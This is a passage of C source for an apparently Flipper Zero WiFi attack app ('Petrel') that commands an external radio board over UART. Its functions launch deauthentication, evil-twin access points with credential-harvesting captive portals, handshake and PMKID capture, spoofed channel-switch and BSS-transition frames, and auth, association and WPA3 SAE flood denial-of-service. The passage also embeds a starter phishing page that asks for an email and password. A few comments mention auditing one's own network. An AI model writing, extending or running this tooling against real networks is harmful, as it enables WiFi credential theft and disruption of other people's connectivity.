    // input dispatch (see the note on PETREL_EVT_INFO_*). Post an event and let the scene's
    // on_event do it, which runs between frames.
    uint32_t ev = PETREL_EVT_INFO_EDIT;
    if(result == GuiButtonTypeCenter) ev = PETREL_EVT_INFO_DEAUTH;
    else if(result == GuiButtonTypeRight) ev = PETREL_EVT_INFO_EVIL;
    post_event(app, ev);
}
void info_wifi_scene_on_enter(void* context) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;

    widget_reset(app->widget);
    // These are handed to the widget, whose draw callback reads them after we return, so they have
    // to outlive the call - static on purpose. Split into single lines: the KARMA and script screens
    // draw that way and render fine, while one multiline block with AlignBottom is the only thing
    // this screen did differently - and it resets the device on this firmware.
    static char infoL1[24];   // SSID (or "No wifi")
    static char infoL2[48];   // security
    static char infoL3[32];   // ch / RSSI
    static char infoL4[24];   // MAC
    snprintf(infoL1, sizeof(infoL1), "No wifi");
    infoL2[0] = '\0'; infoL3[0] = '\0'; infoL4[0] = '\0';
    if(app->selectedWifi >= 0 && app->selectedWifi < app->wifiCount) {
        char* security;
        switch(app->wifiList[app->selectedWifi].security) {
        case 0:
            security = "OPEN";
            break;
        case(WEP_ENABLED):
            security = "WEP";
            break;
        case(WEP_ENABLED | SHARED_ENABLED):
            security = "WEP-SH";
            break;
        case(WPA_SECURITY | TKIP_ENABLED):
            security = "WPA-TK";
            break;
        case(WPA_SECURITY | AES_ENABLED):
            security = "WPA-AES";
            break;
        case(WPA2_SECURITY | AES_ENABLED):
            security = "WPA2-AES";
            break;
        case(WPA2_SECURITY | TKIP_ENABLED):
            security = "WPA2-TK";
            break;
        case(WPA2_SECURITY | AES_ENABLED | TKIP_ENABLED):
            security = "WPA2-MIXTK";
            break;
        case(WPA_SECURITY | WPA2_SECURITY):
            security = "WPA/2";
            break;
        case(WPA_SECURITY | WPA2_SECURITY | TKIP_ENABLED):
            security = "WPA/2-TK";
            break;
        case(WPA_SECURITY | WPA2_SECURITY | AES_ENABLED):
            security = "WPA/2-AES";
            break;
        case(WPA_SECURITY | WPA2_SECURITY | TKIP_ENABLED | AES_ENABLED):
            security = "WPA/2-MIX";
            break;
        case(WPA3_SECURITY | AES_ENABLED):
            security = "WPA3";
            break;
        case(WPA2_SECURITY | WPA3_SECURITY | AES_ENABLED):
            security = "WPA2/3";
            break;
        default:
            security = "";
        }
        char secbuf[48];
        snprintf(
            secbuf,
            sizeof(secbuf),
            "%s%s%s",
            security,
            (app->wifiList[app->selectedWifi].security & WPA3_SECURITY) ? " SAE" : "",
            petrel_pmf_tag(app->wifiList[app->selectedWifi].security));
        char ssidshort[22];   // keep the SSID on one line: a wrapped line pushes the
        strncpy(ssidshort, app->wifiList[app->selectedWifi].APssid, sizeof(ssidshort) - 1);
        ssidshort[sizeof(ssidshort) - 1] = '\0';   // whole block off the top of the screen
        snprintf(infoL1, sizeof(infoL1), "%s", ssidshort);
        snprintf(infoL2, sizeof(infoL2), "%s", secbuf);
        snprintf(
            infoL3,
            sizeof(infoL3),
            "ch %d  RSSI %d",
            app->wifiList[app->selectedWifi].chanel,
            app->wifiList[app->selectedWifi].rssi);
        snprintf(infoL4, sizeof(infoL4), "MAC %s", app->wifiList[app->selectedWifi].APbssid);

        // Always show the action buttons. They used to be gated on a non-"<empty>" SSID,
        // which left a hidden AP's info screen with no <Edit button -> you could not reach
        // the attack config / Tools at all. A hidden AP still has a BSSID, so Deauth/Evil
        // work fine; the SSID shown in the title is "<empty>" but nothing else needs it.
        if(app->wifiList[app->selectedWifi].deauth) {
            widget_add_button_element(
                app->widget, GuiButtonTypeCenter, "Stop", info_wifi_button_press, app);
        } else {
            widget_add_button_element(
                app->widget, GuiButtonTypeCenter, "Deauth", info_wifi_button_press, app);
        }
        widget_add_button_element(app->widget, GuiButtonTypeRight, "Evil", info_wifi_button_press, app);
        widget_add_button_element(app->widget, GuiButtonTypeLeft, "Edit", info_wifi_button_press, app);
    }
    widget_add_string_element(app->widget, 64, 1, AlignCenter, AlignTop, FontSecondary, infoL1);
    widget_add_string_element(app->widget, 64, 13, AlignCenter, AlignTop, FontSecondary, infoL2);
    widget_add_string_element(app->widget, 64, 25, AlignCenter, AlignTop, FontSecondary, infoL3);
    widget_add_string_element(app->widget, 64, 37, AlignCenter, AlignTop, FontSecondary, infoL4);

    view_dispatcher_switch_to_view(app->view_dispatcher, wifiInfoView);
    char cadena[26] = "";

    // These three state commands used to be paced with furi_delay_ms(200) each - 600 ms of frozen
    // input on a screen the user opens constantly. The pacing existed because the board ran its
    // command chain only when its whole line buffer ended in '\n' and then cleared it, so two
    // commands in one loop() pass lost the second one. The board now processes every complete line
    // (firmware item #7), so they can go back to back.
    snprintf(cadena, sizeof(cadena), "APMAC %s\n", app->customMac);
    uart_helper_send(app->uart_helper, cadena, strlen(cadena));

    snprintf(cadena, sizeof(cadena), "REASON %d\n", app->deauthReason);
    uart_helper_send(app->uart_helper, cadena, strlen(cadena));

    petrel_send_portal_sel(app);
}
bool info_wifi_scene_on_event(void* context, SceneManagerEvent event) {
    Petrel* app = context;
    if(event.type != SceneManagerEventTypeCustom) return false;
    char cadena[24] = "";
    switch(event.event) {
    case PETREL_EVT_INFO_DEAUTH:
        FURI_LOG_D(TAG, "%s deauth", __func__);
        if(app->selectedWifi < 0 || app->selectedWifi >= app->wifiCount) return true;
        {
            // Send idAP, not selectedWifi: the list is sorted by RSSI here, while the board's
            // DEAUTH/STOP handlers index their own unsorted scan_results with the number we send.
            int id = app->wifiList[app->selectedWifi].idAP;
            if(app->wifiList[app->selectedWifi].deauth == false) {
                app->wifiList[app->selectedWifi].deauth = true;
                snprintf(cadena, sizeof(cadena), "DEAUTH %d\n", id);
            } else {
                app->wifiList[app->selectedWifi].deauth = false;
                snprintf(cadena, sizeof(cadena), "STOP %d\n", id);
            }
        }
        info_wifi_scene_on_enter(app);
        uart_helper_send(app->uart_helper, cadena, strlen(cadena));
        return true;
    case PETREL_EVT_INFO_EVIL:
        // Clone the selected AP (SSID + channel) as an open AP with the selected portal and deauth
        // the real one, then show the credential screen. The board brings the AP up through its
        // cooperative lifecycle, so loop() stays responsive.
        FURI_LOG_D(TAG, "%s evil", __func__);
        if(app->selectedWifi < 0 || app->selectedWifi >= app->wifiCount) return true;
        {
            int id = app->wifiList[app->selectedWifi].idAP;
            app->wifiList[app->selectedWifi].deauth = true;
            snprintf(cadena, sizeof(cadena), "EVIL %d\n", id);
            uart_helper_send(app->uart_helper, cadena, strlen(cadena));
            scene_manager_next_scene(app->scene_manager, evilCredsScene);
        }
        return true;
    case PETREL_EVT_INFO_EDIT:
        FURI_LOG_D(TAG, "%s edit", __func__);
        scene_manager_next_scene(app->scene_manager, configAttackScene);
        return true;
    }
    return false;
}
void info_wifi_scene_on_exit(void* context) {
    FURI_LOG_D(TAG, __func__);
    UNUSED(context);
}

void portal_type_change_call_back(VariableItem* item) {
    FURI_LOG_D(TAG, __func__);
    int index = variable_item_get_current_value_index(item);
    Petrel* app = variable_item_get_context(item);
    variable_item_set_current_value_text(item, captive_portals[index]);
    app->captivePortal = index;
}

void deauth_reason_change_call_back(VariableItem* item) {
    FURI_LOG_D(TAG, __func__);
    int index = variable_item_get_current_value_index(item);
    Petrel* app = variable_item_get_context(item);
    variable_item_set_current_value_text(item, deauth_reason_short[index]);
    app->deauthReason = index;

    UNUSED(item);
}
void config_attack_scene_on_enter(void* context);
void generate_mac_address(unsigned char mac[6]) {
    furi_hal_random_fill_buf(mac, 6);

    mac[0] &= 0xFE;
    mac[0] |= 0x02;
}
void config_ap_scene_on_enter(void* context);
void mac_type_change_call_back(VariableItem* item) {
    FURI_LOG_D(TAG, __func__);
    int index = variable_item_get_current_value_index(item);
    Petrel* app = variable_item_get_context(item);
    variable_item_set_current_value_text(item, mac_type[index]);
    app->mac_type = index;
    if(app->mac_type == 0) {
        strncpy(app->customMac, "00:E0:4C:01:02:03", 18);
        //snprintf(app->customMac, sizeof(app->customMac), "00:E0:4C:01:02:03");
        parse_mac(app->customMac, app->byte_input_store);

    } else if(app->mac_type == 3) {
        strcpy(app->customMac, app->wifiList[app->selectedWifi].APbssid);
        parse_mac(app->customMac, app->byte_input_store);

    } else if(app->mac_type == 1) {
        unsigned char random_mac[6];
        generate_mac_address(random_mac);
        snprintf(
            app->customMac,
            18,
            "%02X:%02X:%02X:%02X:%02X:%02X",
            random_mac[0],
            random_mac[1],
            random_mac[2],
            random_mac[3],
            random_mac[4],
            random_mac[5]);
        parse_mac(app->customMac, app->byte_input_store);
    }

    // Do NOT rebuild the list from inside this callback. Both config scenes rebuild by calling
    // config_*_scene_on_enter(), which starts with variable_item_list_reset() - i.e. it frees the
    // items of the list whose change callback we are inside right now. Post the rebuild and let the
    // scene's on_event do it between frames (the same rule the Info screen buttons follow).
    post_event(app, PETREL_EVT_REBUILD_VIL);
}

static void petrel_start_capture(Petrel* app, bool grab) {
    FURI_LOG_D(TAG, __func__);
    int ch = petrel_def_ch();
    if(app->selectedWifi >= 0 && app->selectedWifi < app->wifiCount) {
        ch = app->wifiList[app->selectedWifi].chanel;
    }
    char cmd[64];
    if(grab && app->selectedWifi >= 0 && app->selectedWifi < app->wifiCount) {
        // HSGRAB wants the BSSID as 12 hex chars (no colons).
        char hex[13];
        int j = 0;
        const char* b = app->wifiList[app->selectedWifi].APbssid;
        for(int i = 0; b[i] && j < 12; i++) {
            if(b[i] != ':') hex[j++] = b[i];
        }
        hex[j] = '\0';
        if(j != 12) {   // unpadded/malformed MAC -> refuse instead of sending garbage
            snprintf(message, sizeof(message), "Bad BSSID - rescan");
            snprintf(popupHeader, sizeof(popupHeader), "ERROR");
            scene_manager_next_scene(app->scene_manager, popupScene);
            return;
        }
        snprintf(cmd, sizeof(cmd), "HSGRAB %d %s 20\n", ch, hex);
    } else {
        snprintf(cmd, sizeof(cmd), "CAPTURE %d 20\n", ch);
    }
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    // Result is shown when HSDONE arrives (uart_process_line -> popupScene).
    { char b[48]; snprintf(b, sizeof(b), "Capturing on ch %d...", ch); petrel_busy_ex(app, "Handshake", b, 20); }
}

static void petrel_start_pmf(Petrel* app) {
    int ch = petrel_def_ch();
    if(app->selectedWifi >= 0 && app->selectedWifi < app->wifiCount) {
        ch = app->wifiList[app->selectedWifi].chanel;
    }
    recon_text[0] = '\0';
    snprintf(recon_title, sizeof(recon_title), "PMF / WPA3");
    char cmd[32];
    snprintf(cmd, sizeof(cmd), "PMFSCAN %d 5\n", ch);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    { char b[48]; snprintf(b, sizeof(b), "Scanning ch %d...", ch); petrel_busy_ex(app, "PMF/WPA3", b, 5); }
}

// Extract the selected AP's channel and (optionally) colon-stripped BSSID.
static void petrel_sel_ap(Petrel* app, int* ch, char* hex /*>=13*/) {
    *ch = 6;
    hex[0] = '\0';
    if(app->selectedWifi >= 0 && app->selectedWifi < app->wifiCount) {
        *ch = app->wifiList[app->selectedWifi].chanel;
        int j = 0;
        const char* b = app->wifiList[app->selectedWifi].APbssid;
        for(int i = 0; b[i] && j < 12; i++)
            if(b[i] != ':') hex[j++] = b[i];
        hex[j] = '\0';
        if(j != 12) hex[0] = '\0';   // malformed/unpadded MAC -> treat as "no BSSID"
    }
}

static void petrel_start_sta(Petrel* app) {
    int ch;
    char hex[13];
    petrel_sel_ap(app, &ch, hex);
    recon_text[0] = '\0';
    snprintf(recon_title, sizeof(recon_title), "Stations");
    char cmd[48];
    // Firmware parses STASCAN <chan> [bssid-12hex | secs] [secs] -- the BSSID must be the
    // 2nd token (a 12-char 2nd token is treated as the filter); we used to put it 3rd,
    // so the filter was silently ignored.
    if(strlen(hex) == 12) snprintf(cmd, sizeof(cmd), "STASCAN %d %s 8\n", ch, hex);
    else snprintf(cmd, sizeof(cmd), "STASCAN %d 8\n", ch);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    { char b[48]; snprintf(b, sizeof(b), "STA scan ch %d...", ch); petrel_busy_ex(app, "STASCAN", b, 5); }
}

static void petrel_start_pmkid(Petrel* app, bool grab) {
    int ch;
    char hex[13];
    petrel_sel_ap(app, &ch, hex);
    recon_text[0] = '\0';
    snprintf(recon_title, sizeof(recon_title), "PMKID");
    char cmd[48];
    if(grab && hex[0]) snprintf(cmd, sizeof(cmd), "PKGRAB %d %s 10\n", ch, hex);
    else snprintf(cmd, sizeof(cmd), "PMKID %d 10\n", ch);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    wpa_lines[0] = '\0';
    { char b[48]; snprintf(b, sizeof(b), "PMKID ch %d...", ch); petrel_busy_ex(app, "PMKID", b, 10); }
}

// E: guided audit for the selected AP — grab + write /ext/petrel/audit.json.
static void petrel_start_audit(Petrel* app) {
    int ch;
    char hex[13];
    petrel_sel_ap(app, &ch, hex);
    audit_mode = true;
    audit_ch = ch;
    audit_sec = 0;
    audit_ssid[0] = '\0';
    audit_bssid[0] = '\0';
    if(app->selectedWifi >= 0 && app->selectedWifi < app->wifiCount) {
        strncpy(audit_ssid, app->wifiList[app->selectedWifi].APssid, sizeof(audit_ssid) - 1);
        audit_ssid[sizeof(audit_ssid) - 1] = '\0';
        strncpy(audit_bssid, app->wifiList[app->selectedWifi].APbssid, sizeof(audit_bssid) - 1);
        audit_bssid[sizeof(audit_bssid) - 1] = '\0';
        audit_sec = app->wifiList[app->selectedWifi].security;
    }
    // Target BSSID as bytes for capture binding. A wildcard (no AP / all-F) does not bind.
    audit_bssid_valid = false;
    if(hex[0] && strcmp(hex, "FFFFFFFFFFFF") != 0 && strlen(hex) == 12) {
        bool okb = true;
        for(int i = 0; i < 12 && okb; i++) okb = is_hex(hex[i]);
        if(okb) {
            for(int i = 0; i < 6; i++)
                audit_bssid_bytes[i] = (uint8_t)((hexnib(hex[i * 2]) << 4) | hexnib(hex[i * 2 + 1]));
            audit_bssid_valid = true;
        }
    }
    strncpy(audit_hex, hex, sizeof(audit_hex) - 1);   // kept for the STASCAN/grab the chain sends
    audit_hex[sizeof(audit_hex) - 1] = '\0';
    // Unsupported target: an open / WEP AP has no WPA 4-way handshake or RSN PMKID to capture, so
    // there is nothing to audit. WPA1/WPA2/WPA3 all have a 4-way handshake (or PMKID), so they are
    // auditable. Record a structured unsupported result (not just a popup) so a refused audit still
    // leaves evidence in the session dir, then explain on screen.
    if(!(audit_sec & (WPA_SECURITY | WPA2_SECURITY | WPA3_SECURITY))) {
        audit_write_json("unsupported", 0, false, false, "open/WEP: no WPA to audit", "");
        audit_mode = false;
        snprintf(popupHeader, sizeof(popupHeader), "Audit");
        snprintf(message, sizeof(message), "Open/WEP AP: no WPA\nhandshake or PMKID to audit");
        post_event(app, PETREL_EVT_POPUP);
        return;
    }
    recon_text[0] = '\0';
    snprintf(recon_title, sizeof(recon_title), "Audit");
    wpa_lines[0] = '\0';
    // Guided method selection is PMF- and station-aware (vs. the old coarse security-bit guess). We
    // first learn the AP's PMF posture with a PMFSCAN; if it is deauthable we then check whether it
    // has associated clients with a BSSID-filtered STASCAN. PMFDONE/STADONE run audit_pick_method()
    // and launch the grab (see audit_send_grab). That attribution needs a concrete BSSID, so the
    // scan chain only runs for a specific target; a wildcard keeps the old bit heuristic.
    audit_phase = AUDIT_PHASE_NONE;
    audit_pmf_seen = false;
    audit_pmf_req = false;
    audit_stas = 0;
    if(audit_bssid_valid) {
        char cmd[32];
        snprintf(cmd, sizeof(cmd), "PMFSCAN %d 5\n", ch);
        uart_helper_send(app->uart_helper, cmd, strlen(cmd));
        audit_phase = AUDIT_PHASE_PMF;
        { char b[48]; snprintf(b, sizeof(b), "PMF scan ch %d...", ch);
          petrel_busy_ex(app, "Audit: PMF", b, 5); }
        return;
    }
    // Wildcard target (no specific AP): scans can't be attributed to one BSSID, so fall back to the
    // coarse heuristic - PMF/WPA3 bits -> clientless PMKID, else handshake (unchanged behavior).
    bool pmf = (audit_sec & WPA3_SECURITY) || (audit_sec & AES_CMAC_ENABLED);
    char cmd[72];
    const char* label;
    if(pmf) {
        snprintf(cmd, sizeof(cmd), "PMKIDCLIENT %d %s %s\n", ch, "FFFFFFFFFFFF", audit_ssid);
        label = "Audit (PMKID, PMF)";
    } else {
        snprintf(cmd, sizeof(cmd), "HSGRAB %d %s 20\n", ch, "FFFFFFFFFFFF");
        label = "Audit (handshake)";
    }
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    { char b[48]; snprintf(b, sizeof(b), "%s ch %d...", pmf ? "PMKID" : "HS", ch);
      petrel_busy_ex(app, label, b, 20); }
}

// A: capability check from the board's IDENT. Unknown/old fw -> permissive.
static bool petrel_has_cap(Petrel* app, char cap) {
    // An UNKNOWN board must not be treated as capable. This used to return true when the caps
    // string was empty, so a board that had not even answered HELLO presented every
    // capability-gated tool - and pressing one of those rows did nothing or failed confusingly.
    // Deny instead; the hub and the Tools header say "no board" so the user knows why the rows
    // are missing.
    if(app->fw_caps[0] == '\0') return false;
    return strchr(app->fw_caps, cap) != NULL;
}

// C: append the selected AP to the board's multi-target deauth list.
// B2: spoof channel-switch announcements from the selected AP so its clients hop away with no
// deauth at all. Only clients without protected CSA (i.e. not PMF/WPA3-required) obey it.
// A2: device timeline for a channel (MAC / first seen / last seen / frames). The board streams
// CLI:<mac>|<first>|<last>|<count> and ends with CLIDONE:<n>.
static void petrel_track(Petrel* app) {
    int ch = petrel_def_ch();
    char cmd[32];
    snprintf(cmd, sizeof(cmd), "TRACK %d 30\n", ch);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    recon_text[0] = '\0';
    snprintf(recon_title, sizeof(recon_title), "Client tracker");
    { char b[48]; snprintf(b, sizeof(b), "ch %d, 30 s", ch); petrel_busy_ex(app, "Clients", b, 32); }
}

static void petrel_csa(Petrel* app) {
    int ch;
    char hex[13];
    petrel_sel_ap(app, &ch, hex);
    if(hex[0] == '\0') {
        snprintf(popupHeader, sizeof(popupHeader), "CSA");
        snprintf(message, sizeof(message), "Pick an AP first (List Wifi)");
        scene_manager_next_scene(app->scene_manager, popupScene);
        return;
    }
    int newch = (ch <= 6) ? 11 : 1;   // move them as far across 2.4 GHz as the band allows
    char cmd[64];
    // Two passes: the broadcast announcement (cheap, catches clients that listen to those) and a
    // per-station unicast, which is what a real AP does and what most clients actually obey.
    snprintf(cmd, sizeof(cmd), "CSA %s %d %d 12\n", hex, ch, newch);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    furi_delay_ms(120);
    snprintf(cmd, sizeof(cmd), "CSASTAS %s %d %d\n", hex, ch, newch);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    { char b[48]; snprintf(b, sizeof(b), "ch %d -> %d", ch, newch); petrel_busy(app, "CSA", b); }
}

// B3: 802.11v BSS transition management. Asks the selected AP's clients to move to a phantom
// candidate on another channel - the standard steering an AP does for load balancing. Same two
// passes as the CSA attack (broadcast, then per-station unicast, which is what clients obey) and
// no deauth frame anywhere. Same limit too: PMF/WPA3 clients ignore unprotected management
// action frames.
static void petrel_btm(Petrel* app) {
    int ch;
    char hex[13];
    petrel_sel_ap(app, &ch, hex);
    if(hex[0] == '\0') {
        snprintf(popupHeader, sizeof(popupHeader), "BTM");
        snprintf(message, sizeof(message), "Pick an AP first (List Wifi)");
        scene_manager_next_scene(app->scene_manager, popupScene);
        return;
    }
    int newch = (ch <= 6) ? 11 : 1;   // steer them as far across the band as it allows
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "BTM %s %d %d 12\n", hex, ch, newch);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    furi_delay_ms(120);
    snprintf(cmd, sizeof(cmd), "BTMSTAS %s %d %d\n", hex, ch, newch);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    { char b[48]; snprintf(b, sizeof(b), "ch %d -> %d", ch, newch); petrel_busy(app, "BTM", b); }
}

// B5: fill the target AP's association table with clients that do not exist. AUTHFLOOD only
// authenticates; ASSOCFLOOD also associates each fake client and then announces it is going to
// sleep, which is what keeps the AP from reaping the entry. Only the AP is addressed - no frame
// is sent to any real client. This is a denial-of-service against the AP itself, so it belongs on
// your own network (the count is deliberately modest: a huge burst takes the AP down with its
// real clients, which is not what the table test is about).
static void petrel_flood(Petrel* app, bool with_assoc) {
    int ch;
    char hex[13];
    petrel_sel_ap(app, &ch, hex);
    if(hex[0] == '\0') {
        snprintf(popupHeader, sizeof(popupHeader), "Flood");
        snprintf(message, sizeof(message), "Pick an AP first (List Wifi)");
        scene_manager_next_scene(app->scene_manager, popupScene);
        return;
    }
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "%s %s %d 96\n", with_assoc ? "ASSOCFLOOD" : "AUTHFLOOD", hex, ch);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    {
        char b[48];
        snprintf(b, sizeof(b), "ch %d, 96 fake clients", ch);
        petrel_busy(app, with_assoc ? "Assoc+sleep flood" : "Auth flood", b);
    }
}

// B4: WPA3 SAE commit flood. Every frame is an Authentication frame with algorithm 3 and sequence 1
// carrying a random - therefore invalid - scalar and curve element, and each one comes from a
// different MAC, so the AP has to run the elliptic-curve work for every single one before it can
// reject it (the "dragonblood" denial of service). A WPA2-only AP simply ignores the frames; the
// effect needs a WPA3 or transition-mode AP, and it is a DoS against the AP itself, so own network.
static void petrel_saeflood(Petrel* app) {
    int ch;
    char hex[13];
    petrel_sel_ap(app, &ch, hex);
    if(hex[0] == '\0') {
        snprintf(popupHeader, sizeof(popupHeader), "SAE flood");
        snprintf(message, sizeof(message), "Pick an AP first (List Wifi)");
        scene_manager_next_scene(app->scene_manager, popupScene);
        return;
    }
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "SAEFLOOD %s %d 96\n", hex, ch);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    {
        char b[48];
        snprintf(b, sizeof(b), "ch %d, 96 commits", ch);
        petrel_busy(app, "SAE flood", b);
    }
}

static void petrel_deauth_add(Petrel* app) {
    int ch;
    char hex[13];
    petrel_sel_ap(app, &ch, hex);
    char cmd[48];
    snprintf(cmd, sizeof(cmd), "DEAUTHADD %s FFFFFFFFFFFF %d\n", hex[0] ? hex : "FFFFFFFFFFFF", ch);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    { char b[48]; snprintf(b, sizeof(b), "Deauth list + ch %d", ch); petrel_busy(app, "Deauth list", b); }
}

// C: arm the list (runs round-robin on the board).
static void petrel_deauth_run(Petrel* app) {
    uart_helper_send(app->uart_helper, "DEAUTHRUN\n", 10);
    petrel_busy(app, "Deauth list", "Deauth list running");
}

// C: clear/disarm the list without the WiFi teardown that STOP causes.
static void petrel_deauth_stop(Petrel* app) {
    uart_helper_send(app->uart_helper, "DEAUTHCLEAR\n", 12);
    snprintf(message, sizeof(message), "Deauth list cleared");
    snprintf(popupHeader, sizeof(popupHeader), "Deauth list");
    scene_manager_next_scene(app->scene_manager, popupScene);
}

// B: abort an in-flight async capture (streams what was captured; no WiFi teardown).
static void petrel_capture_stop(Petrel* app) {
    uart_helper_send(app->uart_helper, "CAPSTOP\n", 8);
    snprintf(message, sizeof(message), "Capture aborted");
    snprintf(popupHeader, sizeof(popupHeader), "Capture");
    scene_manager_next_scene(app->scene_manager, popupScene);
}

// P6 clientless: raw-assoc PMKID grab using the selected AP's SSID.
static void petrel_start_pmkid_clientless(Petrel* app) {
    int ch;
    char hex[13];
    petrel_sel_ap(app, &ch, hex);
    char ssid[33] = "";
    if(app->selectedWifi >= 0 && app->selectedWifi < app->wifiCount)
        strncpy(ssid, app->wifiList[app->selectedWifi].APssid, sizeof(ssid) - 1);
    recon_text[0] = '\0';
    wpa_lines[0] = '\0';
    snprintf(recon_title, sizeof(recon_title), "PMKID");
    char cmd[80];
    snprintf(cmd, sizeof(cmd), "PMKIDCLIENT %d %s %s\n", ch, hex[0] ? hex : "FFFFFFFFFFFF", ssid);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    { char b[48]; snprintf(b, sizeof(b), "PMKID(clientless) ch %d...", ch); petrel_busy_ex(app, "PMKID", b, 6); }
}

// A1: probe-request sniffer — harvest nearby devices' remembered SSIDs (their PNL).
static void petrel_start_probe(Petrel* app) {
    int ch = petrel_def_ch();
    if(app->selectedWifi >= 0 && app->selectedWifi < app->wifiCount)
        ch = app->wifiList[app->selectedWifi].chanel;
    recon_text[0] = '\0';
    snprintf(recon_title, sizeof(recon_title), "Probe / PNL");
    char cmd[32];
    snprintf(cmd, sizeof(cmd), "PROBESNIFF %d 12\n", ch);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    { char b[48]; snprintf(b, sizeof(b), "Probes on ch %d...", ch); petrel_busy_ex(app, "Probe / PNL", b, 12); }
}

// B6: clone the selected AP's SSID across many random BSSIDs (AP clone spam).
static void petrel_apclone(Petrel* app) {
    const char* ssid = "*";
    int ch = petrel_def_ch();
    if(app->selectedWifi >= 0 && app->selectedWifi < app->wifiCount) {
        ssid = app->wifiList[app->selectedWifi].APssid;
        ch = app->wifiList[app->selectedWifi].chanel;
    }
    char cmd[80];
    // The board must be tuned to a channel before each raw TX or the SDK spins forever
    // inside the TX path, so the target's channel goes along with the clone request.
    snprintf(cmd, sizeof(cmd), "APCLONE %s 8 %d\n", ssid, ch);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    { char b[48]; snprintf(b, sizeof(b), "Cloning %.16s ch %d", ssid, ch); petrel_busy(app, "AP clone", b); }
}

// B7: emit probe requests (as a client) for the selected AP's SSID.
static void petrel_probeflood(Petrel* app) {
    int ch = petrel_def_ch();
    const char* ssid = "*";
    if(app->selectedWifi >= 0 && app->selectedWifi < app->wifiCount) {
        ch = app->wifiList[app->selectedWifi].chanel;
        ssid = app->wifiList[app->selectedWifi].APssid;
    }
    char cmd[80];
    snprintf(cmd, sizeof(cmd), "PROBEFLOOD %d %s 24\n", ch, ssid);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    petrel_busy(app, "Probe flood", "Sending probes...");
}

// A5: deauth/disassoc IDS — list other people's deauth frames seen on the channel.
static void petrel_start_ids(Petrel* app) {
    int ch = petrel_def_ch();
    if(app->selectedWifi >= 0 && app->selectedWifi < app->wifiCount)
        ch = app->wifiList[app->selectedWifi].chanel;
    recon_text[0] = '\0';
    snprintf(recon_title, sizeof(recon_title), "Deauth IDS");
    char cmd[32];
    snprintf(cmd, sizeof(cmd), "SNIFFDEAUTH %d 12\n", ch);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    { char b[48]; snprintf(b, sizeof(b), "Watching ch %d...", ch); petrel_busy_ex(app, "Deauth IDS", b, 12); }
}

// gap: send a custom portal HTML from /ext/petrel/portal.html to the board (chunked hex).
// Portal file browser: list *.html in /ext/petrel/portals/, pick one, stream it to the board.
#define PORTAL_FILES_MAX 16
static char portal_names[PORTAL_FILES_MAX][48];
static int portal_file_count = 0;

// C4: drop a minimal starter portal so /ext/petrel/portals is never empty and there is a working
// example to copy. Its GET form lands on /login?email=..&pass=.. which the firmware forwards as
// "EV:..." (the same credential path the design portals use).
static const char* STARTER_PORTAL_HTML =
    "<!doctype html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>"
    "<title>Wi-Fi Sign-in</title></head>"
    "<body style='font-family:sans-serif;text-align:center;padding:2em'>"
    "<h2>Wi-Fi Sign-in</h2><p>Please sign in with your account to continue</p>"
    "<form action='/login'>"
    "<p><input name='email' placeholder='Email' style='padding:.6em;width:80%'></p>"
    "<p><input name='pass' type='password' placeholder='Password' style='padding:.6em;width:80%'></p>"
    "<p><button type='submit' style='padding:.8em 2em'>Sign in</button></p>"
    "</form></body></html>";

static void petrel_write_starter_portal(void) {
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, "/ext/petrel/portals");
    File* f = storage_file_alloc(st);
    if(storage_file_open(f, "/ext/petrel/portals/starter.html", FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        storage_file_write(f, STARTER_PORTAL_HTML, strlen(STARTER_PORTAL_HTML));
        storage_file_close(f);
    }
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
}

static void portal_list_load(void) {
    portal_file_count = 0;
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, "/ext/petrel/portals");
    File* dir = storage_file_alloc(st);
    if(storage_dir_open(dir, "/ext/petrel/portals")) {
        FileInfo fi;
        char name[64];
        while(storage_dir_read(dir, &fi, name, sizeof(name)) && portal_file_count < PORTAL_FILES_MAX) {
            if(file_info_is_dir(&fi)) continue;
            size_t l = strlen(name);
            if(l > 5 && strcmp(name + l - 5, ".html") == 0) {
                strncpy(portal_names[portal_file_count], name, 47);
                portal_names[portal_file_count][47] = '\0';
                portal_file_count++;
            }
        }
        storage_dir_close(dir);
    }
    storage_file_free(dir);
    furi_record_close(RECORD_STORAGE);
    if(portal_file_count == 0) {   // C4: seed a starter template
        petrel_write_starter_portal();
        strncpy(portal_names[0], "starter.html", 47);
        portal_names[0][47] = '\0';
        portal_file_count = 1;
    }
}

static void petrel_load_portal_file(Petrel* app, const char* name) {
    char path[96];
    snprintf(path, sizeof(path), "/ext/petrel/portals/%s", name);
    // ponytail: read buffer on demand, not resident BSS. The FAP idles at ~19 KB free heap and this
    // buffer lived for the whole session while only being used here (portal load never overlaps a
    // recon scan) - moving it off BSS gives recon result scenes the headroom they were OOM-crashing
    // the whole Flipper for (B2). Fragmentation-safe: at idle largest free block ~= free heap.
    // PORTAL_MAX: the board's customPortal is 6144 bytes and reserves one for the terminator, so a
    // 6144-byte file would upload short and fail the hash check. Cap at 6143 and refuse longer files
    // instead of truncating them silently.
#define PORTAL_MAX 6143
    uint8_t* buf = malloc(PORTAL_MAX);
    if(!buf) {
